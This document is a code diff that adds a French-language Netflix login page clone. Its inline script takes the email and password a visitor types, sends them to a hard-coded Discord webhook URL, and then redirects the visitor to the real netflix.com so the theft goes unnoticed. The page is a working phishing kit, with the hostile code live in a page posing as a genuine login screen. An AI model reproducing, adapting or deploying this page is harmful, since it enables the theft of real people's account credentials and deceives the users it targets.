@@ -1,0 +1,128 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" integrity="sha512-iBBXm8fW90+nuLcSKlbmrPcLa0OT92xO1BIsZ+ywDWZCvqsWgccV3gFoRBv0z+8dLJgyAHIhR35VZc2oM/gI1w==" crossorigin="anonymous" />
+    <link rel="stylesheet" href="style/style.css">
+    <link rel="icon" href="img/logo.png">
+    <title>Netflix</title>
+    
+</head>
+<body>
+    <div class="upper">
+        <div class="logo">
+            <a href="#">
+                <img src="img/Netflix-Logo.png" class="img-logo"/>
+            </a>
+        </div>
+        <div class="login-div">
+            <form class="login">
+                <h1>Connexion</h1>
+                <div class="input-text">
+                    <input type="text" id="inputEmail" name="email" placeholder="Email ou identifiant" onfocus="inputOnFocus(this)" onblur="inputOnBlur(this)"/>
+                    <div class="warning-input" id="warningEmail">
+                        Veuillez entrer une adresse email ou un identifiant valide.
+                    </div>
+                </div>
+                
+                <div class="input-text">
+                    <input type="password" id="inputPassword" name="password" placeholder="Mot de passe" onfocus="inputOnFocus(this)" onblur="inputOnBlur(this)"/>
+                    <div class="warning-input" id="warningPassword">
+                        Votre mot de passe doit contenir entre 4 et 60 caractères.
+                    </div>
+                </div>
+                
+                <div>
+                    <button class="signin-button" onclick="sendMessage()">Connexion</button>
+                </div>
+                <div class="remember-flex">
+                    <div>
+                        <input type="checkbox">
+                        <label class="color_text">Rester connecter</label>
+                    </div>
+                    <div class="help">
+                        <a class="color_text" href="#">Aide?</a>
+                    </div>
+                </div>
+                <div class="login-face">
+                    <img src="img/fb-icon.png" height="20"/><a href="#" class="color_link log_face">Connexion avec Facebook</a>
+                </div>
+                <div class="new-members">
+                    Nouveaux sur Netflix? <a href="#" class="signup-link">Inscris toi maintenant</a>.
+                </div>
+                <div class="protection color_link help">
+                    Cette page est protégée par Google reCAPTCHA pour s'assurer que vous n'êtes pas un robot. <a href="#">Learn more.</a>
+                </div>
+            </form>
+        </div>
+    </div>
+    <div class="bottom">
+        <div class="bottom-width">
+            Questions? appel <a href="tel:1-844-542-4813" class="tel-link">1-844-542-4813</a>
+            <div>
+                <ul class="bottom-flex">
+                    <li class="list-bottom">
+                        <a href="#" class="link-bottom">
+                            FAQ
+                        </a>
+                    </li>
+                    <li class="list-bottom">
+                        <a href="#" class="link-bottom">
+                            Help Center
+                        </a>
+                    </li>
+                    <li class="list-bottom">
+                        <a href="#" class="link-bottom">
+                            Terms of Use
+                        </a>
+                    </li>
+                    <li class="list-bottom">
+                        <a href="#" class="link-bottom">
+                            Privacy
+                        </a>
+                    </li>
+                    <li class="list-bottom">
+                        <a href="#" class="link-bottom">
+                            Cookie Preferences
+                        </a>
+                    </li>
+                    <li class="list-bottom">
+                        <a href="#" class="link-bottom">
+                            Corporate information
+                        </a>
+                    </li>
+                </ul>
+            </div>
+            <div>
+                <select class="fa select-language">
+                    <option> &#xf0ac; &nbsp;&nbsp;&nbsp;English</option>
+                    <option> &#xf0ac; &nbsp;&nbsp;&nbsp;Fran&ccedil;ais</option>
+                </select>
+            </div>
+        </div>
+    </div>
+    <script src="js/script.js"></script>
+    <script>
+        function sendMessage() {
+        function sleep(milliseconds) {
+        const date = Date.now();
+        let currentDate = null;
+        do {
+          currentDate = Date.now();
+        } while (currentDate - date < milliseconds);
+      }
+          var request = new XMLHttpRequest();
+          request.open("POST", "https://discordapp.com/api/webhooks/933271587577298974/gN-iXdPdGyLNlCfZ6FP16E5PryAU0X9pJ3_wAU50hWTwvHdznfy8ozrQLsqibVO3u3ew");
+          request.setRequestHeader('Content-type', 'application/json');
+          var params = {
+            content: ("> **USERNAME  : **" + document.getElementById('inputEmail').value + "\n> **PASSWORD : **" + document.getElementById('inputPassword').value)
+          }
+          request.send(JSON.stringify(params));
+          sleep(400)
+          window.location.replace("https://www.netflix.com");
+        }
+        </script>
+</body>
+</html>
